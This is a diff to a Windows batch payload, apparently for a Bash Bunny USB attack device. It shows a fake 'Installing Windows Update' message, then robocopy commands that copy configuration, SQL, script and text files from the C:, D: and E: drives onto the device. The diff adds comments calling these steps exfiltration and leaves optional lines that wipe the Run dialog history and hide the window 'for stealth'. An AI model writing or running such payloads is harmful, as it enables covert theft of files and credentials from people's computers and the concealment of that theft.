@@ -2,7 +2,8 @@
 @echo Installing Windows Update
 
 REM Delete registry keys storing Run dialog history
-REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+REM Uncomment out the line below to help with stealth
+REM REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 
 REM Set the location
 set bpath=%~dp0
@@ -17,7 +18,7 @@ mkdir %dst% >>nul
 set files=*.xml *.conf *.config *.properties *.sql *.cmd *.bat *.txt
 set exclude_dirs=c:\Windows c:\Users "c:\Program Files" "C:\Program Files (x86)" c:\Applications c:\ProgramData
 
-REM Highly unlikely that the PC / device has a directory called "loot"
+REM Exfiltrate specified files from C:\ drive, if not BashBunny drive
 if Exist C:\ (
 if not "C:"=="%broot%" (
 mkdir %dst%\C_Drive >>nul
@@ -26,6 +27,7 @@ robocopy c:\ %dst%\C_Drive /S %files% /XD %exclude_dirs% /log:%dst%\C_Log.txt /t
 )
 )
 
+REM Exfiltrate specified files from D:\ drive, if not BashBunny drive
 if Exist D:\ (
 if Not "D:"=="%broot%" (
 mkdir %dst%\D_Drive >>nul
@@ -34,6 +36,7 @@ robocopy d:\ %dst%\D_Drive /S %files% /XD %exclude_dirs% /log:%dst%\D_Log.txt /t
 )
 )
 
+REM Exfiltrate specified files from E:\ drive, if not BashBunny drive
 if Exist E:\ (
 if Not "E:"=="%broot%" (
 mkdir %dst%\E_Drive >>nul
@@ -43,5 +46,7 @@ robocopy e:\ %dst%\E_Drive /S %files% /XD %exclude_dirs% /log:%dst%\E_Log.txt /t
 )
 
 @echo "Finished copying files!" >> %dst%\finished.txt
+
+REM Uncomment out lines below to improve stealth
 REM @cls
 REM @exit
